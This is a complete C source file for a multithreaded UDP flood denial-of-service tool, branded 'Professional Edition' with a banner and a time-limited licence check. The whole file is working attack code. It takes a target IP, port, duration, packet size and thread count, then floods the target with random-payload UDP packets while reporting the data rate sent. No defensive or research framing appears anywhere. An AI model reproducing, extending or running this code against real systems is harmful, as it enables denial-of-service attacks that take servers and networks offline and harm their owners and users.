#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <stdatomic.h>

// ANSI color codes
#define RED     "\x1B[31m"
#define GREEN   "\x1B[32m"
#define YELLOW  "\x1B[33m"
#define BLUE    "\x1B[34m"
#define MAGENTA "\x1B[35m"
#define CYAN    "\x1B[36m"
#define WHITE   "\x1B[37m"
#define RESET   "\x1B[0m"
#define BOLD    "\x1B[1m"

// Expiry Date (YYYY, MM, DD, HH)
#define EXP_YEAR 2025
#define EXP_MONTH 12
#define EXP_DAY 31
#define EXP_HOUR 23

// Structure to store attack parameters
typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    int packet_size;
    int thread_id;
} attack_params;

// Global variables
volatile int keep_running = 1;
atomic_long total_data_sent = 0;

// Function to check if the tool has expired
int is_expired() {
    time_t now;
    struct tm *exp_time;
    time(&now);
    exp_time = localtime(&now);
    
    exp_time->tm_year = EXP_YEAR - 1900;
    exp_time->tm_mon = EXP_MONTH - 1;
    exp_time->tm_mday = EXP_DAY;
    exp_time->tm_hour = EXP_HOUR;
    exp_time->tm_min = 0;
    exp_time->tm_sec = 0;
    
    time_t expiry = mktime(exp_time);
    return now > expiry;
}

// Show fancy header with colors
void show_header() {
    printf("\n");
    printf(BOLD CYAN "  ██████╗ ██████╗ ███████╗███████╗████████╗\n");
    printf("  ██╔══██╗██╔══██╗██╔════╝██╔════╝╚══██╔══╝\n");
    printf("  ██████╔╝██████╔╝███████╗█████╗     ██║   \n");
    printf("  ██╔═══╝ ██╔══██╗╚════██║██╔══╝     ██║   \n");
    printf("  ██║     ██║  ██║███████║███████╗   ██║   \n");
    printf("  ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   \n" RESET);
    printf(BOLD YELLOW "  UDP Flood Tool (Professional Edition)\n" RESET);
    printf(BOLD BLUE "  --------------------------------------\n\n" RESET);
}

// Show expiry message with colors
void show_expiry_message() {
    printf("\n");
    printf(BOLD RED "  ╔════════════════════════════════════════════╗\n");
    printf("  ║                TOOL EXPIRED                ║\n");
    printf("  ╠════════════════════════════════════════════╣\n");
    printf("  ║ This version has expired on %02d/%02d/%04d %02d:00 ║\n", EXP_DAY, EXP_MONTH, EXP_YEAR, EXP_HOUR);
    printf("  ║                                            ║\n");
    printf("  ║ Please contact the developer for           ║\n");
    printf("  ║ a new version with extended validity.      ║\n");
    printf("  ║                                            ║\n");
    printf("  ║ Thank you for using our professional tool! ║\n");
    printf("  ╚════════════════════════════════════════════╝\n" RESET);
    printf("\n");
}

// Signal handler to stop the attack
void handle_signal(int signal) {
    keep_running = 0;
    printf(BOLD YELLOW "\n\n  [!] CTRL+C detected. Stopping attack...\n" RESET);
}

// Function to generate a random payload
void generate_random_payload(char *payload, int size) {
    for (int i = 0; i < size; i++) {
        payload[i] = rand() % 256;  // Random byte between 0 and 255
    }
}

// Function to monitor total network usage in real time
void *network_monitor(void *arg) {
    time_t start_time = time(NULL);
    while (keep_running) {
        sleep(1);  // Update every second
        time_t current_time = time(NULL);
        long data_sent_in_bytes = total_data_sent;
        double data_sent_in_mb = data_sent_in_bytes / (1024.0 * 1024.0);
        double mbps = (data_sent_in_bytes * 8) / (1024.0 * 1024.0 * (current_time - start_time + 1));
        
        printf(BOLD GREEN "\r  [STATUS] Time: %lds | Data: %.2f MB | Speed: %.2f Mbps" RESET, 
               (current_time - start_time), data_sent_in_mb, mbps);
        fflush(stdout);
    }
    pthread_exit(NULL);
}

// Function to perform the UDP flooding
void *udp_flood(void *arg) {
    attack_params *params = (attack_params *)arg;
    int sock;
    struct sockaddr_in server_addr;
    char *message;

    // Create a UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        printf(BOLD RED "  [ERROR] Socket creation failed for thread %d\n" RESET, params->thread_id);
        return NULL;
    }

    // Set up server address structure
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->target_port);
    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);

    if (server_addr.sin_addr.s_addr == INADDR_NONE) {
        printf(BOLD RED "  [ERROR] Invalid IP address for thread %d\n" RESET, params->thread_id);
        close(sock);
        return NULL;
    }

    // Allocate memory for the flooding message
    message = (char *)malloc(params->packet_size);
    if (message == NULL) {
        printf(BOLD RED "  [ERROR] Memory allocation failed for thread %d\n" RESET, params->thread_id);
        close(sock);
        return NULL;
    }

    // Generate random payload
    generate_random_payload(message, params->packet_size);

    // Time-bound attack loop
    time_t end_time = time(NULL) + params->duration;
    while (time(NULL) < end_time && keep_running) {
        sendto(sock, message, params->packet_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        atomic_fetch_add(&total_data_sent, params->packet_size);
    }

    free(message);
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    // Show header
    show_header();

    // Check expiry date
    if (is_expired()) {
        show_expiry_message();
        return EXIT_FAILURE;
    }

    // Validate arguments
    if (argc != 6) {
        printf(BOLD YELLOW "  [USAGE] %s [IP] [PORT] [TIME] [PACKET_SIZE] [THREAD_COUNT]\n\n" RESET, argv[0]);
        printf(BOLD WHITE "  [EXAMPLE] %s 192.168.1.1 80 60 1024 10\n" RESET, argv[0]);
        printf(BOLD CYAN "  - Attacks 192.168.1.1 on port 80 for 60 seconds\n");
        printf("  - Uses 1024 byte packets with 10 threads\n\n" RESET);
        return EXIT_FAILURE;
    }

    // Parse input arguments
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int packet_size = atoi(argv[4]);
    int thread_count = atoi(argv[5]);

    if (packet_size <= 0 || thread_count <= 0) {
        printf(BOLD RED "  [ERROR] Invalid packet size or thread count.\n" RESET);
        return EXIT_FAILURE;
    }

    // Show attack parameters
    printf(BOLD MAGENTA "  [TARGET] " RESET "IP: " BOLD WHITE "%s" RESET " | Port: " BOLD WHITE "%d\n" RESET, target_ip, target_port);
    printf(BOLD MAGENTA "  [PARAMS] " RESET "Duration: " BOLD WHITE "%d sec" RESET " | Packet Size: " BOLD WHITE "%d bytes" RESET " | Threads: " BOLD WHITE "%d\n\n" RESET, 
           duration, packet_size, thread_count);
    printf(BOLD YELLOW "  [STATUS] Starting attack... Press CTRL+C to stop\n" RESET);

    // Setup signal handler
    signal(SIGINT, handle_signal);

    // Array of thread IDs
    pthread_t threads[thread_count];
    attack_params params[thread_count];

    // Create a thread for network monitoring
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, network_monitor, NULL);

    // Launch multiple threads for flooding
    for (int i = 0; i < thread_count; i++) {
        params[i].target_ip = target_ip;
        params[i].target_port = target_port;
        params[i].duration = duration;
        params[i].packet_size = packet_size;
        params[i].thread_id = i;

        if (pthread_create(&threads[i], NULL, udp_flood, &params[i]) != 0) {
            printf(BOLD RED "  [ERROR] Failed to create thread %d\n" RESET, i);
        }
    }

    // Wait for all threads to finish
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    // Stop the network monitor thread
    keep_running = 0;
    pthread_join(monitor_thread, NULL);

    // Calculate and display final statistics
    double total_mb = total_data_sent / (1024.0 * 1024.0);
    double avg_mbps = (total_data_sent * 8) / (1024.0 * 1024.0 * duration);
    
    printf(BOLD GREEN "\n\n  [STATUS] Attack finished successfully!\n" RESET);
    printf(BOLD CYAN "  [RESULTS] Total data sent: %.2f MB\n" RESET, total_mb);
    printf(BOLD CYAN "  [RESULTS] Average speed: %.2f Mbps\n" RESET, avg_mbps);
    printf(BOLD GREEN "  [STATUS] All threads stopped.\n\n" RESET);
    
    return EXIT_SUCCESS;
}